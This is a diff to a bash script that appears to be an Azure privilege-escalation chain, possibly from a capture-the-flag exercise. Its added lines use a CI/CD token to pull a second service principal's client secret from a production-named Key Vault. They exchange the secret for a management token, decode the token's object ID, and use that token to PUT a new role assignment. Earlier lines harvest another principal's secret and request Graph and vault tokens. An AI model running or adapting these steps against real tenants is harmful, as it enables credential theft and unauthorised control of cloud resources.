@@ -11,6 +11,10 @@ sv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault
 pa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$sv")
 ps=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$sv")
 echo PA_ID=$pa PS_LEN=${#ps}
+ssv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/secrets-sync-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
+sa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$ssv")
+ss=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$ssv")
+echo SA_ID=$sa SS_LEN=${#ss}
 graph=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://graph.microsoft.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo GRAPH_LEN=${#graph}
 name=ctf$(date +%s)
@@ -36,6 +40,14 @@ rid2=$(python3 -c 'import uuid; print(uuid.uuid4())')
 rb2=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
 rr2=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $par" -H 'Content-Type: application/json' --data "$rb2" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid2?api-version=2022-04-01")
 echo PA_ROLE_ASSIGN=$(echo "$rr2" | tail -c 900)
+sarsp=$(curl -sS -X POST "$BASE" -d "client_id=$sa" -d scope=https://management.azure.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ss")
+sar=$(echo "$sarsp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
+sa_oid=$(echo "$sar" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
+echo SA_ARM_LEN=${#sar} SA_OID=$sa_oid
+rid3=$(python3 -c 'import uuid; print(uuid.uuid4())')
+rb3=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
+rr3=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $sar" -H 'Content-Type: application/json' --data "$rb3" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid3?api-version=2022-04-01")
+echo SA_ROLE_ASSIGN=$(echo "$rr3" | tail -c 900)
 for i in $(seq 1 12); do
   sleep 5
   at=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
